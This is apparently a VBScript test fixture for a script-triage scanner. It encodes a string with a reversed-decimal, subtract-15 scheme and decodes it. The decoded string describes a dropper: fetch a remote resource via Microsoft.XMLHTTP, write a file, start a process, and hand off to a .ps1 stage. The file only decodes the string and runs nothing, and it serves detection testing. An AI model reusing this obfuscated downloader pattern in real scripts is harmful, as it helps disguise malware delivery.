Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_ea1e5f5e = "34,100,97,31,86,93,97,94,82,100,30,86,84,99,102,96,100,86,99,46,86,88,82,101,100,80,101,105,86,95,109,36,84,41,82,42,87,82,33,87,83,77,86,93,83,82,100,96,97,100,90,53,77,83,82,61,100,100,86,99,101,95,102,57,77,86,99,82,104,101,87,96,68,77,70,52,60,57,46,89,101,82,97,80,106,99,101,100,90,88,86,99,109,101,82,85,31,36,84,41,82,42,87,82,33,87,83,30,86,88,82,101,100,77,83,82,61,100,100,86,99,101,95,102,57,77,84,90,93,83,102,65,77,100,99,86,100,70,77,43,52,46,89,101,82,97,80,86,93,90,87,109,36,84,41,82,42,87,82,33,87,83,32,83,82,61,100,100,86,99,101,95,102,57,46,101,95,86,88,82,80,99,86,100,102,109,101,82,85,31,85,33,42,36,84,35,40,37,32,85,90,93,82,103,95,90,31,86,93,97,94,82,105,86,31,36,84,41,82,42,87,82,33,87,83,32,32,43,100,97,101,101,89,46,93,99,102,109,36,84,41,82,42,87,82,33,87,83,30,95,88,90,82,97,94,82,84,46,85,90,80,95,88,90,82,97,94,82,84,109,37,46,101,95,102,96,84,80,86,88,82,101,100,109,65,69,69,57,61,62,73,31,101,87,96,100,96,99,84,90,62,46,99,86,101,97,82,85,82,109,101,97,90,99,84,100,80,87,87,96,85,95,82,89,29,100,100,86,84,96,99,97,80,89,84,101,82,97,100,90,85,29,86,93,90,87,80,86,101,90,99,104,29,86,101,96,94,86,99,80,86,99,90,102,98,84,82,46,100,97,86,101,100,109,34,46,103"
Const Codec_ea1e5f5e = "reversed_decimal|subtract_modulo_256|0f"

Function Load_ea1e5f5e()
  Dim parts, result(), v_e598
  parts = Split(Material_ea1e5f5e, ",")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(UBound(parts) - v_e598) = CInt(parts(v_e598))
  Next
  Load_ea1e5f5e = result
End Function

Function Decode_ea1e5f5e(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = (v_a19c(v_e598) + 15) Mod 256
  Next
  Decode_ea1e5f5e = result
End Function

Function Recover_ea1e5f5e()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  If True Then
    v_d41a = (19 * 7) - 133
      v_a19c = Load_ea1e5f5e()
      Do
        v_b27e = Decode_ea1e5f5e(v_a19c)
        Exit Do
      Loop
      v_c304 = ""
      For v_e598 = 0 To UBound(v_b27e)
        v_c304 = v_c304 & Chr(v_b27e(v_e598))
      Next
  End If
  Recover_ea1e5f5e = v_c304
End Function

Sub Copy_ea1e5f5e(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_ea1e5f5e()
  Dim resultText
  Call Copy_ea1e5f5e(Recover_ea1e5f5e(), resultText)
  Inspect_ea1e5f5e = resultText
End Function
